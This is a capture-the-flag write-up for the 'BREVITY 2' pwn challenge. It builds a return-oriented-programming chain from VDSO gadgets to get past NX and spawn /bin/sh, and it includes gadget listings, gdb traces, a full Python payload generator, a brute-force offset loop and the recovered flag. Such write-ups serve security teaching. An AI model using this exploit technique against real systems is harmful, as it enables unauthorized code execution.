## BREVITY 2 [210]

## Solution
Similar goal to [BREVITY [200]](../200_BREVITY), but NX is enabled so that we cannot just execute shellcode on the stack. We must create a ROP chain using the VDSO (which is only loaded once the program starts):
```
ameise@STAHLKERN:~/CS2015/pwn/210_BREVITY_2$ ROPgadget --binary brevity2
Gadgets information
============================================================
0x080480e6 : add al, 0 ; add byte ptr [eax], al ; int 0x80
0x080480c2 : add byte ptr [eax + 1], bh ; int 0x80
0x080480d8 : add byte ptr [eax + 3], bh ; int 0x80
0x080480e4 : add byte ptr [eax + 4], bh ; int 0x80
0x080480c0 : add byte ptr [eax], al ; add byte ptr [eax + 1], bh ; int 0x80
0x080480d6 : add byte ptr [eax], al ; add byte ptr [eax + 3], bh ; int 0x80
0x080480e2 : add byte ptr [eax], al ; add byte ptr [eax + 4], bh ; int 0x80
0x080480d5 : add byte ptr [eax], al ; add byte ptr [eax], al ; mov eax, 3 ; int 0x80
0x080480c6 : add byte ptr [eax], al ; int 0x80
0x080480c1 : add byte ptr [eax], al ; mov eax, 1 ; int 0x80
0x080480d7 : add byte ptr [eax], al ; mov eax, 3 ; int 0x80
0x080480e3 : add byte ptr [eax], al ; mov eax, 4 ; int 0x80
0x080480c4 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80
0x080480e1 : add dword ptr [eax], eax ; add byte ptr [eax], al ; mov eax, 4 ; int 0x80
0x080480da : add eax, dword ptr [eax] ; add byte ptr [eax], al ; int 0x80
0x080480ec : add esp, 0x10 ; ret
0x080480b9 : in al, dx ; pop eax ; ret
0x080480c8 : int 0x80
0x080480ed : les edx, ptr [eax] ; ret
0x080480b7 : mov bl, 0x81 ; in al, dx ; pop eax ; ret
0x080480c3 : mov eax, 1 ; int 0x80
0x080480d9 : mov eax, 3 ; int 0x80
0x080480e5 : mov eax, 4 ; int 0x80
0x080480ba : pop eax ; ret
0x080480bf : pop es ; add byte ptr [eax], al ; add byte ptr [eax + 1], bh ; int 0x80
0x080480bb : ret

Unique gadgets found: 26
```
However, we are going to need more gadgets than just the ones from the binary itself. Luckily, there are other libraries loaded into memory by default, such as the VDSO (virtual dynamic shared object) loaded into memory for every Linux program:
```
ameise@shell:/tmp/ameise$ gdb /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2 -q
Reading symbols from /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2...(no debugging symbols found)...done.
(gdb) set disassembly intel
(gdb) disas main
Dump of assembler code for function main:
   0x080480ca <+0>:	sub    esp,0x10
   0x080480cd <+3>:	mov    edx,0x38
   0x080480d2 <+8>:	mov    ecx,esp
   0x080480d4 <+10>:	mov    ebx,0x0
   0x080480d9 <+15>:	mov    eax,0x3
   0x080480de <+20>:	int    0x80
   0x080480e0 <+22>:	mov    ebx,0x1
   0x080480e5 <+27>:	mov    eax,0x4
   0x080480ea <+32>:	int    0x80
   0x080480ec <+34>:	add    esp,0x10
   0x080480ef <+37>:	ret    
End of assembler dump.
(gdb) info files
Symbols from "/home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2".
Local exec file:
	`/home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2', file type elf32-i386.
	Entry point: 0x80480b8
	0x08048094 - 0x080480b8 is .note.gnu.build-id
	0x080480b8 - 0x080480f0 is .text
(gdb) break main
Breakpoint 1 at 0x80480ca
(gdb) run
Starting program: /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2 

Breakpoint 1, 0x080480ca in main ()
(gdb) info files
Symbols from "/home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2".
Native process:
	Using the running image of child process 27919.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2', file type elf32-i386.
	Entry point: 0x80480b8
	0x08048094 - 0x080480b8 is .note.gnu.build-id
	0x080480b8 - 0x080480f0 is .text
	0xf7ffd0b4 - 0xf7ffd0ec is .hash in system-supplied DSO at 0xf7ffd000
	0xf7ffd0ec - 0xf7ffd17c is .dynsym in system-supplied DSO at 0xf7ffd000
	0xf7ffd17c - 0xf7ffd211 is .dynstr in system-supplied DSO at 0xf7ffd000
	0xf7ffd212 - 0xf7ffd224 is .gnu.version in system-supplied DSO at 0xf7ffd000
	0xf7ffd224 - 0xf7ffd278 is .gnu.version_d in system-supplied DSO at 0xf7ffd000
	0xf7ffd278 - 0xf7ffd2f8 is .dynamic in system-supplied DSO at 0xf7ffd000
	0xf7ffd2f8 - 0xf7ffd50c is .rodata in system-supplied DSO at 0xf7ffd000
	0xf7ffd50c - 0xf7ffd56c is .note in system-supplied DSO at 0xf7ffd000
	0xf7ffd56c - 0xf7ffd590 is .eh_frame_hdr in system-supplied DSO at 0xf7ffd000
	0xf7ffd590 - 0xf7ffd698 is .eh_frame in system-supplied DSO at 0xf7ffd000
	0xf7ffd6a0 - 0xf7ffdc14 is .text in system-supplied DSO at 0xf7ffd000
	0xf7ffdc14 - 0xf7ffdc2c is .altinstructions in system-supplied DSO at 0xf7ffd000
	0xf7ffdc2c - 0xf7ffdc32 is .altinstr_replacement in system-supplied DSO at 0xf7ffd000
(gdb) dump binary memory brevity_vdso 0xf7ffd0b4 0xf7ffdc33
(gdb) 

```

Now we can `scp` the VDSO dump and analyze it with `ROPgadget`, using a starting address of `0xf7ffd0b4` for any gadgets we find:
```
ameise@STAHLKERN:~/CS2015/pwn/210_BREVITY_2$ scp ameise@shell.cyberstakesonline.com:/tmp/ameise/brevity_vdso brevity_vdso 
ameise@STAHLKERN:~/CS2015/pwn/210_BREVITY_2$ ls -l
total 8
-rw-rw-r-- 1 ameise ameise  732 Oct 18  2015 brevity2
-rw-rw-r-- 1 ameise ameise 2943 Sep  8 23:00 brevity_vdso
ameise@STAHLKERN:~/CS2015/pwn/210_BREVITY_2$ ROPgadget --binary brevity_vdso --rawArch=x86 --rawMode=32 --offset 0xf7ffd0b4
Gadgets information
============================================================
0xf7ffd742 : adc al, 0x31 ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0xf7ffd855 : adc al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffd108 : adc dword ptr [eax], eax ; int1 ; call dword ptr [esi]
0xf7ffd6a6 : adc eax, 0x81000005 ; ret
0xf7ffdbef : add byte ptr [eax + 0xad], bh ; int 0x80
0xf7ffd106 : add byte ptr [eax], al ; adc dword ptr [eax], eax ; int1 ; call dword ptr [esi]
0xf7ffdbed : add byte ptr [eax], al ; add byte ptr [eax + 0xad], bh ; int 0x80
0xf7ffd104 : add byte ptr [eax], al ; add byte ptr [eax], al ; adc dword ptr [eax], eax ; int1 ; call dword ptr [esi]
0xf7ffd102 : add byte ptr [eax], al ; add byte ptr [eax], al ; add byte ptr [eax], al ; adc dword ptr [eax], eax ; int1 ; call dword ptr [esi]
0xf7ffd103 : add byte ptr [eax], al ; add byte ptr [eax], al ; add byte ptr [ecx], dl ; add cl, dh ; call dword ptr [esi]
0xf7ffdbec : add byte ptr [eax], al ; add byte ptr [eax], al ; mov eax, 0xad ; int 0x80
0xf7ffdbfc : add byte ptr [eax], al ; add byte ptr [eax], al ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
0xf7ffdbfd : add byte ptr [eax], al ; add byte ptr [ecx + 0x52], dl ; push ebp ; mov ebp, esp ; sysenter
0xf7ffd105 : add byte ptr [eax], al ; add byte ptr [ecx], dl ; add cl, dh ; call dword ptr [esi]
0xf7ffdbe4 : add byte ptr [eax], al ; int 0x80
0xf7ffdbee : add byte ptr [eax], al ; mov eax, 0xad ; int 0x80
0xf7ffdbfe : add byte ptr [eax], al ; push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
0xf7ffdbff : add byte ptr [ecx + 0x52], dl ; push ebp ; mov ebp, esp ; sysenter
0xf7ffd107 : add byte ptr [ecx], dl ; add cl, dh ; call dword ptr [esi]
0xf7ffdbb4 : add cl, byte ptr [ecx + 0x5d5f5e32] ; ret
0xf7ffd109 : add cl, dh ; call dword ptr [esi]
0xf7ffd853 : add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffd740 : add esp, 0x14 ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdbbd : and al, 0xc3 ; mov ebx, dword ptr [esp] ; ret
0xf7ffd7f5 : and byte ptr [edi], cl ; inc ebp ; ret 0x450f
0xf7ffd6a5 : call 0xb11
0xf7ffd10b : call dword ptr [esi]
0xf7ffd6d8 : cmp eax, esi ; jb 0x61d ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffd6a2 : in eax, 0x56 ; push ebx ; call 0xb14
0xf7ffd7f7 : inc ebp ; ret 0x450f
0xf7ffdbe6 : int 0x80
0xf7ffd10a : int1 ; call dword ptr [esi]
0xf7ffdbe2 : ja 0xb34 ; add byte ptr [eax], al ; int 0x80
0xf7ffd6da : jb 0x61b ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffdbb3 : je 0xb0a ; mov dword ptr [edx], esi ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdadb : jge 0x9b4 ; les edx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdb38 : jmp 0xa4a
0xf7ffdada : jne 0xaae ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffd854 : les edx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffd741 : les edx, ptr [ecx + esi] ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0xf7ffdbb5 : mov dword ptr [edx], esi ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdbe1 : mov eax, 0x77 ; int 0x80
0xf7ffdbf0 : mov eax, 0xad ; int 0x80
0xf7ffdb30 : mov eax, dword ptr [ebx - 0x1208] ; xor edx, edx ; jmp 0xa52
0xf7ffdbb1 : mov eax, esi ; je 0xb0c ; mov dword ptr [edx], esi ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffd6ca : mov eax, esi ; mov edx, ecx ; nop ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffdc03 : mov ebp, esp ; sysenter
0xf7ffdbbf : mov ebx, dword ptr [esp] ; ret
0xf7ffd851 : mov ebx, edx ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdbbb : mov ecx, dword ptr [esp] ; ret
0xf7ffd6cc : mov edx, ecx ; nop ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffd9fd : mov esi, 0x81000001 ; ret
0xf7ffdc0d : nop ; int 0x80
0xf7ffdc0c : nop ; nop ; int 0x80
0xf7ffdc0b : nop ; nop ; nop ; int 0x80
0xf7ffdc0a : nop ; nop ; nop ; nop ; int 0x80
0xf7ffdc09 : nop ; nop ; nop ; nop ; nop ; int 0x80
0xf7ffdc08 : nop ; nop ; nop ; nop ; nop ; nop ; int 0x80
0xf7ffdc07 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; int 0x80
0xf7ffdbdd : nop ; nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0xf7ffdbde : nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0xf7ffdbdf : nop ; pop eax ; mov eax, 0x77 ; int 0x80
0xf7ffd6cf : nop ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffdbbc : or al, 0x24 ; ret
0xf7ffd6db : out dx, al ; pop ebx ; pop esi ; pop ebp ; ret
0xf7ffdbe0 : pop eax ; mov eax, 0x77 ; int 0x80
0xf7ffdc10 : pop ebp ; pop edx ; pop ecx ; ret
0xf7ffd6d2 : pop ebp ; ret
0xf7ffd6d0 : pop ebx ; pop esi ; pop ebp ; ret
0xf7ffd745 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdc12 : pop ecx ; ret
0xf7ffd747 : pop edi ; pop ebp ; ret
0xf7ffdc11 : pop edx ; pop ecx ; ret
0xf7ffd6d1 : pop esi ; pop ebp ; ret
0xf7ffd746 : pop esi ; pop edi ; pop ebp ; ret
0xf7ffdb35 : push dword ptr [ecx] ; shr bl, cl ; ret
0xf7ffdc02 : push ebp ; mov ebp, esp ; sysenter
0xf7ffd6a4 : push ebx ; call 0xb12
0xf7ffdc00 : push ecx ; push edx ; push ebp ; mov ebp, esp ; sysenter
0xf7ffdc01 : push edx ; push ebp ; mov ebp, esp ; sysenter
0xf7ffd6a3 : push esi ; push ebx ; call 0xb13
0xf7ffd744 : rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0xf7ffd524 : ret
0xf7ffd7f8 : ret 0x450f
0xf7ffd852 : rol dword ptr [ebx + 0x5e5b14c4], cl ; pop edi ; pop ebp ; ret
0xf7ffdbc0 : sbb al, 0x24 ; ret
0xf7ffdc0f : sbb byte ptr [ebp + 0x5a], 0x59 ; ret
0xf7ffd7f4 : shl dword ptr [eax], 0xf ; inc ebp ; ret 0x450f
0xf7ffdb37 : shr bl, cl ; ret
0xf7ffdc05 : sysenter
0xf7ffdc06 : xor al, 0x90 ; nop ; nop ; nop ; nop ; nop ; nop ; int 0x80
0xf7ffdbb6 : xor bl, byte ptr [esi + 0x5f] ; pop ebp ; ret
0xf7ffd743 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xf7ffdb36 : xor edx, edx ; jmp 0xa4c

Unique gadgets found: 94
```

We need to find gadgets that accomplish our same shellcode (spawning a shell with `execve("sh"))`:
```
0xf7ffdc11 : pop edx ; pop ecx ; ret
0xf7ffd6d0 : pop ebx ; pop esi ; pop ebp ; ret
0x080480ba : pop eax ; ret
0xf7ffdbe6 : int 0x80
```

Now we have to align our payload so that the correct values are popped into the correct registers when executing the ROP chain:
```
"/bin/"          argument to execve()
"sh\x00a"        argument to execve(continued)
"aaaa"           padding
"aaaa"           padding
0xf7ffdc11       gadget: pop 
0x00000000       pop into edx
0x00000000       pop into ecx
0xf7ffd6d0       gadget: pop ebx; pop esi; pop ebp; ret
0xaabbccdd       address: "/bin/sh\x00" - pop into ebx              <=== this value may differ between gdb and native
"aaaa"           filler - pop into esi
"aaaa"           filler - pop into ebp
0x080480ba       gadget: pop eax; ret
0x0000000b       syscall number for execve() - pop into eax
0xf7ffdbe6       int 0x80
```

Python script to generate input:
```Python
BUFFERSTART = 0xffff1344
COMMAND = "/bin/sh"

def LittleEndian(hexnum):
  s = ""
  s += chr( (hexnum) & 0xff)
  s += chr( (hexnum >> 8) & 0xff)
  s += chr( (hexnum >> 16) & 0xff) 
  s += chr( (hexnum >> 24) & 0xff) 
  return s

bufferstart = BUFFERSTART
command = COMMAND + "\x00"

payload = ""
payload += command
payload += "a"*(16 - len(command))
payload += LittleEndian(0xf7ffdc11)
payload += LittleEndian(0x00000000)
payload += LittleEndian(0x00000000)
payload += LittleEndian(0xf7ffd6d0)
payload += LittleEndian(bufferstart)
payload += "aaaa"
payload += "aaaa"
payload += LittleEndian(0x080480ba)
payload += LittleEndian(0x0000000b)
payload += LittleEndian(0xf7ffdbe6)

print "len: " + str(len(payload))

fp = open("input","wb")
fp.write(payload)
fp.close()
```

Works in `gdb` on the server:
```
ameise@shell:/tmp/ameise$ gdb /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2 -q
Reading symbols from /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2...(no debugging symbols found)...done.
(gdb) set disassembly intel
(gdb) disas main
Dump of assembler code for function main:
   0x080480ca <+0>:	sub    esp,0x10
   0x080480cd <+3>:	mov    edx,0x38
   0x080480d2 <+8>:	mov    ecx,esp
   0x080480d4 <+10>:	mov    ebx,0x0
   0x080480d9 <+15>:	mov    eax,0x3
   0x080480de <+20>:	int    0x80
   0x080480e0 <+22>:	mov    ebx,0x1
   0x080480e5 <+27>:	mov    eax,0x4
   0x080480ea <+32>:	int    0x80
   0x080480ec <+34>:	add    esp,0x10
   0x080480ef <+37>:	ret    
End of assembler dump.
(gdb) break *0x080480d2
Breakpoint 1 at 0x80480d2
(gdb) break *0x080480ef
Breakpoint 2 at 0x80480ef
(gdb) run < input 
Starting program: /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2 < input

Breakpoint 1, 0x080480d2 in main ()
(gdb) c
Continuing.
/bin/shaaaaaaaa�������D��aaaaaaaa��
                                     ����
Breakpoint 2, 0x080480ef in main ()
(gdb) display/5i
Argument required (expression to compute).
(gdb) display/5i $eip
1: x/5i $eip
=> 0x80480ef <main+37>:	ret    
   0x80480f0:	add    BYTE PTR [esi],ch
   0x80480f2:	jae    0x804816d
   0x80480f4:	ins    DWORD PTR es:[edi],dx
   0x80480f5:	je     0x8048158
(gdb) si
0xf7ffdc11 in __kernel_vsyscall ()
1: x/5i $eip
=> 0xf7ffdc11 <__kernel_vsyscall+17>:	pop    edx
   0xf7ffdc12 <__kernel_vsyscall+18>:	pop    ecx
   0xf7ffdc13 <__kernel_vsyscall+19>:	ret    
   0xf7ffdc14:	pushf  
   0xf7ffdc15:	cli    
(gdb) si
0xf7ffdc12 in __kernel_vsyscall ()
1: x/5i $eip
=> 0xf7ffdc12 <__kernel_vsyscall+18>:	pop    ecx
   0xf7ffdc13 <__kernel_vsyscall+19>:	ret    
   0xf7ffdc14:	pushf  
   0xf7ffdc15:	cli    
   0xf7ffdc16:	(bad)  
(gdb) si
0xf7ffdc13 in __kernel_vsyscall ()
1: x/5i $eip
=> 0xf7ffdc13 <__kernel_vsyscall+19>:	ret    
   0xf7ffdc14:	pushf  
   0xf7ffdc15:	cli    
   0xf7ffdc16:	(bad)  
   0xf7ffdc17:	call   DWORD PTR [eax+eax*1]
(gdb) si
0xf7ffd6d0 in ?? ()
1: x/5i $eip
=> 0xf7ffd6d0:	pop    ebx
   0xf7ffd6d1:	pop    esi
   0xf7ffd6d2:	pop    ebp
   0xf7ffd6d3:	ret    
   0xf7ffd6d4:	lea    esi,[esi+eiz*1+0x0]
(gdb) si
0xf7ffd6d1 in ?? ()
1: x/5i $eip
=> 0xf7ffd6d1:	pop    esi
   0xf7ffd6d2:	pop    ebp
   0xf7ffd6d3:	ret    
   0xf7ffd6d4:	lea    esi,[esi+eiz*1+0x0]
   0xf7ffd6d8:	cmp    eax,esi
(gdb) si
0xf7ffd6d2 in ?? ()
1: x/5i $eip
=> 0xf7ffd6d2:	pop    ebp
   0xf7ffd6d3:	ret    
   0xf7ffd6d4:	lea    esi,[esi+eiz*1+0x0]
   0xf7ffd6d8:	cmp    eax,esi
   0xf7ffd6da:	jb     0xf7ffd6ca
(gdb) si
0xf7ffd6d3 in ?? ()
1: x/5i $eip
=> 0xf7ffd6d3:	ret    
   0xf7ffd6d4:	lea    esi,[esi+eiz*1+0x0]
   0xf7ffd6d8:	cmp    eax,esi
   0xf7ffd6da:	jb     0xf7ffd6ca
   0xf7ffd6dc:	pop    ebx
(gdb) si
0x080480ba in _start ()
1: x/5i $eip
=> 0x80480ba <_start+2>:	pop    eax
   0x80480bb <_start+3>:	ret    
   0x80480bc <_start+4>:	add    BYTE PTR [eax],al
   0x80480be <_start+6>:	call   0x80480ca <main>
   0x80480c3 <_start+11>:	mov    eax,0x1
(gdb) si
0x080480bb in _start ()
1: x/5i $eip
=> 0x80480bb <_start+3>:	ret    
   0x80480bc <_start+4>:	add    BYTE PTR [eax],al
   0x80480be <_start+6>:	call   0x80480ca <main>
   0x80480c3 <_start+11>:	mov    eax,0x1
   0x80480c8 <_start+16>:	int    0x80
(gdb) si
<signal handler called>
1: x/5i $eip
=> 0xf7ffdbe6 <__kernel_sigreturn+6>:	int    0x80
   0xf7ffdbe8 <__kernel_sigreturn+8>:	nop
   0xf7ffdbe9:	lea    esi,[esi+eiz*1+0x0]
   0xf7ffdbf0 <__kernel_rt_sigreturn>:	mov    eax,0xad
   0xf7ffdbf5 <__kernel_rt_sigreturn+5>:	int    0x80
(gdb) si
process 10292 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80480d2
Cannot insert breakpoint 2.
Cannot access memory at address 0x80480ef

```

Natively, it does not work, and the `dmesg` output is not very helpful:
```
ameise@shell:/tmp/ameise$ cat input -| /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2 
/bin/shaaaaaaaa�������D��aaaaaaaa��
                                     ����ls
Segmentation fault
ameise@shell:/tmp/ameise$ dmesg | tail -n 1
[17184775.529270] traps: brevity2[10561] general protection ip:0 sp:0 error:0 in brevity2[8048000+1000]
ameise@shell:/tmp/ameise$ 
```

This probably means that we popped a `0x00000000` off of the stack into `eip` during a `ret` instruction instead of what we wanted (our payload does have a lot of `0x00000000`s in it). We will have to manually iterate until a shell is spawned - usually the values do not differ more than `0x60` bytes or so between `gdb` and running natively. We can modify the Python script to offset `BUFFERSTART` based on a counter supplied on the command line:
```Python
import sys
counter = int(sys.argv[1])

BUFFERSTART = 0xffff1344
COMMAND = "/bin/sh"

def LittleEndian(hexnum):
  s = ""
  s += chr( (hexnum) & 0xff)
  s += chr( (hexnum >> 8) & 0xff)
  s += chr( (hexnum >> 16) & 0xff)
  s += chr( (hexnum >> 24) & 0xff)
  return s

bufferstart = BUFFERSTART + (0x10 * counter)
command = COMMAND + "\x00"

payload = ""
payload += command
payload += "a"*(16 - len(command))
payload += LittleEndian(0xf7ffdc11)
payload += LittleEndian(0x00000000)
payload += LittleEndian(0x00000000)
payload += LittleEndian(0xf7ffd6d0)
payload += LittleEndian(bufferstart)
payload += "aaaa"
payload += "aaaa"
payload += LittleEndian(0x080480ba)
payload += LittleEndian(0x0000000b)
payload += LittleEndian(0xf7ffdbe6)

print "len: " + str(len(payload))

fp = open("input","wb")
fp.write(payload)
fp.close()
```

Then just click `[enter]` until our shell is spawned with the correct stack offset:
```
ameise@shell:/tmp/ameise$ for i in `seq -10 10`; python solve.py $i; cat input -| /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2; done
-bash: syntax error near unexpected token `python'
ameise@shell:/tmp/ameise$ for i in `seq -10 10`; do python solve.py $i; cat input -| /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5/brevity2; done
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa����������aaaaaaaa��
                                     ����
Segmentation fault
len: 56
/bin/shaaaaaaaa���������aaaaaaaa��
                                     ����



pwd
/tmp/ameise
cd /home/problems/4f0b129340d901c0e5121a69d5e21d31/brevity-2_5
ls
brevity2  flag
cat flag
bDCEf2fa709278Ca_now_you_know_the_vdso

exit
exit
len: 56
/bin/shaaaaaaaa���������aaaaaaaa��
                                     ����^CSegmentation fault

ameise@shell:/tmp/ameise$ 
```